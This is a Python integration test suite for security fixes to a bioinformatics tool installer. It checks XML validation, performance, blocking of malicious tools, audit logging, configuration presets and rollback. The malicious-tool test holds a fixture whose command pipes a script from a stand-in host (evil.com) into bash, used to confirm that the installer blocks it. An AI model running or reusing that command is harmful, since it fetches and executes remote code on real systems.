"""
Integration Feasibility Tests

Tests to verify the security fixes can be safely integrated into the system.
Tests compatibility, performance, and correctness before deployment.
"""

import sys
import tempfile
import shutil
from pathlib import Path
import time
import json

# Add fixes to path
sys.path.insert(0, str(Path(__file__).parent.parent / "fixes"))

from tool_xml_validator import ToolXMLValidator, SecurityLevel
from secure_tool_installer import SecureToolInstaller
from config import ToolInstallationConfig


class TestResults:
    """Track test results."""
    def __init__(self):
        self.tests_run = 0
        self.tests_passed = 0
        self.tests_failed = 0
        self.errors = []

    def record_pass(self, test_name):
        self.tests_run += 1
        self.tests_passed += 1
        print(f"✅ PASS: {test_name}")

    def record_fail(self, test_name, error):
        self.tests_run += 1
        self.tests_failed += 1
        self.errors.append((test_name, error))
        print(f"❌ FAIL: {test_name}")
        print(f"   Error: {error}")

    def summary(self):
        return {
            "total": self.tests_run,
            "passed": self.tests_passed,
            "failed": self.tests_failed,
            "success_rate": (self.tests_passed / self.tests_run * 100) if self.tests_run > 0 else 0,
            "errors": self.errors
        }


def test_1_validator_on_real_tools(results):
    """Test XML validator on actual tool files."""
    print("\n" + "="*70)
    print("TEST 1: XML Validator on Real Tools")
    print("="*70)

    backend_tools = Path("/home/yzhang/biomate/backend/tools/nfcore_generated")

    if not backend_tools.exists():
        results.record_fail("test_1_validator_on_real_tools", "nfcore_generated directory not found")
        return

    # Test on a few real tools
    test_tools = list(backend_tools.glob("*.xml"))[:5]

    if len(test_tools) == 0:
        results.record_fail("test_1_validator_on_real_tools", "No XML files found")
        return

    validator = ToolXMLValidator(strict_mode=True)

    try:
        for tool_file in test_tools:
            is_safe, issues = validator.validate_file(tool_file)
            print(f"  Validated: {tool_file.name}")
            print(f"    Safe: {is_safe}, Issues: {len(issues)}")

            # Should detect vulnerabilities in unfixed tools
            if "advanced_options" in tool_file.read_text():
                has_critical = any(i.level == SecurityLevel.CRITICAL for i in issues)
                if has_critical:
                    print(f"    ✅ Correctly detected vulnerability")
                else:
                    print(f"    ⚠️  Warning: Expected to detect vulnerability")

        results.record_pass("test_1_validator_on_real_tools")
    except Exception as e:
        results.record_fail("test_1_validator_on_real_tools", str(e))


def test_2_validator_performance(results):
    """Test validator performance on batch operations."""
    print("\n" + "="*70)
    print("TEST 2: Validator Performance")
    print("="*70)

    backend_tools = Path("/home/yzhang/biomate/backend/tools/nfcore_generated")

    if not backend_tools.exists():
        results.record_fail("test_2_validator_performance", "nfcore_generated directory not found")
        return

    test_tools = list(backend_tools.glob("*.xml"))[:100]  # Test on 100 files

    if len(test_tools) < 10:
        results.record_fail("test_2_validator_performance", "Not enough XML files for performance test")
        return

    validator = ToolXMLValidator(strict_mode=True)

    try:
        start_time = time.time()

        for tool_file in test_tools:
            validator.validate_file(tool_file)

        end_time = time.time()
        elapsed = end_time - start_time
        avg_time = elapsed / len(test_tools) * 1000  # ms per file

        print(f"  Validated {len(test_tools)} files in {elapsed:.2f} seconds")
        print(f"  Average: {avg_time:.2f}ms per file")

        if avg_time < 100:  # Should be under 100ms per file
            results.record_pass("test_2_validator_performance")
        else:
            results.record_fail("test_2_validator_performance", f"Too slow: {avg_time:.2f}ms per file")

    except Exception as e:
        results.record_fail("test_2_validator_performance", str(e))


def test_3_secure_installer_basic(results):
    """Test secure installer basic functionality."""
    print("\n" + "="*70)
    print("TEST 3: Secure Installer Basic Functionality")
    print("="*70)

    with tempfile.TemporaryDirectory() as tmpdir:
        galaxy_root = Path(tmpdir) / "galaxy"
        galaxy_root.mkdir()

        biomate_tools = Path(tmpdir) / "tools"
        biomate_tools.mkdir()

        # Create a safe test tool
        test_tool = biomate_tools / "test_tool.xml"
        test_tool.write_text("""<tool id="test_tool" name="Test Tool" version="1.0">
    <description>Safe test tool</description>
    <command>echo "test"</command>
    <inputs>
        <param name="input" type="data" format="txt"/>
    </inputs>
    <outputs>
        <data name="output" format="txt"/>
    </outputs>
</tool>""")

        try:
            installer = SecureToolInstaller(
                galaxy_root=str(galaxy_root),
                biomate_tools_root=str(biomate_tools),
                require_user_approval=False  # Automatic for tests
            )

            # Test installation
            success, msg = installer.install_tool("test_tool")

            if success:
                print(f"  ✅ Installation succeeded: {msg}")

                # Check if file was copied
                installed_file = galaxy_root / "tools" / "biomate_custom"
                if any(installed_file.rglob("test_tool.xml")):
                    print(f"  ✅ Tool file copied successfully")
                    results.record_pass("test_3_secure_installer_basic")
                else:
                    results.record_fail("test_3_secure_installer_basic", "Tool file not found after installation")
            else:
                results.record_fail("test_3_secure_installer_basic", f"Installation failed: {msg}")

        except Exception as e:
            results.record_fail("test_3_secure_installer_basic", str(e))


def test_4_secure_installer_blocks_malicious(results):
    """Test that secure installer blocks malicious tools."""
    print("\n" + "="*70)
    print("TEST 4: Secure Installer Blocks Malicious Tools")
    print("="*70)

    with tempfile.TemporaryDirectory() as tmpdir:
        galaxy_root = Path(tmpdir) / "galaxy"
        galaxy_root.mkdir()

        biomate_tools = Path(tmpdir) / "tools"
        biomate_tools.mkdir()

        # Create a malicious test tool
        malicious_tool = biomate_tools / "malicious_tool.xml"
        malicious_tool.write_text("""<tool id="malicious_tool" name="Malicious Tool" version="1.0">
    <description>Malicious test tool</description>
    <command>curl http://evil.com/steal.sh | bash</command>
    <inputs>
        <param name="input" type="data" format="txt"/>
    </inputs>
    <outputs>
        <data name="output" format="txt"/>
    </outputs>
</tool>""")

        try:
            installer = SecureToolInstaller(
                galaxy_root=str(galaxy_root),
                biomate_tools_root=str(biomate_tools),
                require_user_approval=False,
                strict_validation=True  # Should block
            )

            # Try to install malicious tool
            success, msg = installer.install_tool("malicious_tool")

            if not success:
                print(f"  ✅ Correctly blocked malicious tool: {msg}")

                # Check that it's not installed
                installed_file = galaxy_root / "tools" / "biomate_custom"
                if not any(installed_file.rglob("malicious_tool.xml")) if installed_file.exists() else True:
                    print(f"  ✅ Malicious tool was not installed")
                    results.record_pass("test_4_secure_installer_blocks_malicious")
                else:
                    results.record_fail("test_4_secure_installer_blocks_malicious", "Malicious tool was installed!")
            else:
                results.record_fail("test_4_secure_installer_blocks_malicious", "Malicious tool was not blocked!")

        except Exception as e:
            results.record_fail("test_4_secure_installer_blocks_malicious", str(e))


def test_5_audit_logging(results):
    """Test that audit logging works."""
    print("\n" + "="*70)
    print("TEST 5: Audit Logging")
    print("="*70)

    with tempfile.TemporaryDirectory() as tmpdir:
        galaxy_root = Path(tmpdir) / "galaxy"
        galaxy_root.mkdir()

        biomate_tools = Path(tmpdir) / "tools"
        biomate_tools.mkdir()

        # Create a test tool
        test_tool = biomate_tools / "test_tool.xml"
        test_tool.write_text("""<tool id="test_tool" name="Test Tool" version="1.0">
    <command>echo "test"</command>
</tool>""")

        try:
            installer = SecureToolInstaller(
                galaxy_root=str(galaxy_root),
                biomate_tools_root=str(biomate_tools),
                require_user_approval=False
            )

            # Install tool
            installer.install_tool("test_tool")

            # Check audit log
            audit_log = galaxy_root / "database" / "tool_installation_audit.json"

            if audit_log.exists():
                with open(audit_log) as f:
                    log_data = json.load(f)

                if "events" in log_data and len(log_data["events"]) > 0:
                    print(f"  ✅ Audit log created with {len(log_data['events'])} events")

                    # Check for validation event
                    has_validation = any(e["event_type"] == "xml_validation" for e in log_data["events"])
                    if has_validation:
                        print(f"  ✅ Validation event logged")
                        results.record_pass("test_5_audit_logging")
                    else:
                        results.record_fail("test_5_audit_logging", "Validation event not found in audit log")
                else:
                    results.record_fail("test_5_audit_logging", "Audit log is empty")
            else:
                results.record_fail("test_5_audit_logging", "Audit log file not created")

        except Exception as e:
            results.record_fail("test_5_audit_logging", str(e))


def test_6_backward_compatibility(results):
    """Test backward compatibility with original ToolAutoInstaller interface."""
    print("\n" + "="*70)
    print("TEST 6: Backward Compatibility")
    print("="*70)

    with tempfile.TemporaryDirectory() as tmpdir:
        galaxy_root = Path(tmpdir) / "galaxy"
        galaxy_root.mkdir()

        try:
            # Test that SecureToolInstaller has same basic interface as ToolAutoInstaller
            installer = SecureToolInstaller(
                galaxy_root=str(galaxy_root),
                biomate_tools_root=None  # Should handle None
            )

            # Check for key methods
            required_methods = ["install_tool", "is_tool_installed", "_find_tool_in_biomate_repo"]
            missing_methods = []

            for method in required_methods:
                if not hasattr(installer, method):
                    missing_methods.append(method)

            if not missing_methods:
                print(f"  ✅ All required methods present")
                results.record_pass("test_6_backward_compatibility")
            else:
                results.record_fail("test_6_backward_compatibility", f"Missing methods: {missing_methods}")

        except Exception as e:
            results.record_fail("test_6_backward_compatibility", str(e))


def test_7_configuration_system(results):
    """Test configuration system."""
    print("\n" + "="*70)
    print("TEST 7: Configuration System")
    print("="*70)

    try:
        # Test preset configs
        dev_config = ToolInstallationConfig.development()
        prod_config = ToolInstallationConfig.production()
        test_config = ToolInstallationConfig.testing()

        # Verify development config
        if not dev_config.require_user_approval and dev_config.enable_xml_validation:
            print(f"  ✅ Development config correct (automatic, validated)")
        else:
            results.record_fail("test_7_configuration_system", "Development config incorrect")
            return

        # Verify production config
        if prod_config.require_user_approval and prod_config.strict_validation:
            print(f"  ✅ Production config correct (approval required, strict)")
        else:
            results.record_fail("test_7_configuration_system", "Production config incorrect")
            return

        # Verify testing config
        if not test_config.require_user_approval and not test_config.strict_validation:
            print(f"  ✅ Testing config correct (automatic, lenient)")
        else:
            results.record_fail("test_7_configuration_system", "Testing config incorrect")
            return

        results.record_pass("test_7_configuration_system")

    except Exception as e:
        results.record_fail("test_7_configuration_system", str(e))


def test_8_rollback_capability(results):
    """Test rollback functionality."""
    print("\n" + "="*70)
    print("TEST 8: Rollback Capability")
    print("="*70)

    with tempfile.TemporaryDirectory() as tmpdir:
        galaxy_root = Path(tmpdir) / "galaxy"
        galaxy_root.mkdir()

        biomate_tools = Path(tmpdir) / "tools"
        biomate_tools.mkdir()

        # Create a test tool
        test_tool = biomate_tools / "test_tool.xml"
        test_tool.write_text("""<tool id="test_tool" name="Test Tool" version="1.0">
    <command>echo "test"</command>
</tool>""")

        try:
            installer = SecureToolInstaller(
                galaxy_root=str(galaxy_root),
                biomate_tools_root=str(biomate_tools),
                require_user_approval=False
            )

            # Install tool
            success, msg = installer.install_tool("test_tool")

            if not success:
                results.record_fail("test_8_rollback_capability", "Installation failed")
                return

            # Verify installed
            if "test_tool" not in installer.installed_tools_cache["installed_tools"]:
                results.record_fail("test_8_rollback_capability", "Tool not in cache")
                return

            print(f"  ✅ Tool installed successfully")

            # Rollback
            rollback_success, rollback_msg = installer.rollback_installation("test_tool")

            if rollback_success:
                print(f"  ✅ Rollback succeeded: {rollback_msg}")

                # Verify removed from cache
                if "test_tool" not in installer.installed_tools_cache["installed_tools"]:
                    print(f"  ✅ Tool removed from cache")
                    results.record_pass("test_8_rollback_capability")
                else:
                    results.record_fail("test_8_rollback_capability", "Tool still in cache after rollback")
            else:
                results.record_fail("test_8_rollback_capability", f"Rollback failed: {rollback_msg}")

        except Exception as e:
            results.record_fail("test_8_rollback_capability", str(e))


def main():
    """Run all integration tests."""
    print("\n" + "="*70)
    print("INTEGRATION FEASIBILITY TEST SUITE")
    print("Testing if security fixes can be safely integrated")
    print("="*70)

    results = TestResults()

    # Run all tests
    test_1_validator_on_real_tools(results)
    test_2_validator_performance(results)
    test_3_secure_installer_basic(results)
    test_4_secure_installer_blocks_malicious(results)
    test_5_audit_logging(results)
    test_6_backward_compatibility(results)
    test_7_configuration_system(results)
    test_8_rollback_capability(results)

    # Print summary
    print("\n" + "="*70)
    print("TEST SUMMARY")
    print("="*70)

    summary = results.summary()
    print(f"Total Tests: {summary['total']}")
    print(f"Passed: {summary['passed']}")
    print(f"Failed: {summary['failed']}")
    print(f"Success Rate: {summary['success_rate']:.1f}%")

    if summary['failed'] > 0:
        print("\n❌ FAILED TESTS:")
        for test_name, error in summary['errors']:
            print(f"  - {test_name}: {error}")
        print("\n⛔ RECOMMENDATION: DO NOT INTEGRATE - Fix issues first")
        return 1
    else:
        print("\n✅ ALL TESTS PASSED")
        print("🟢 RECOMMENDATION: SAFE TO INTEGRATE")
        return 0


if __name__ == "__main__":
    sys.exit(main())
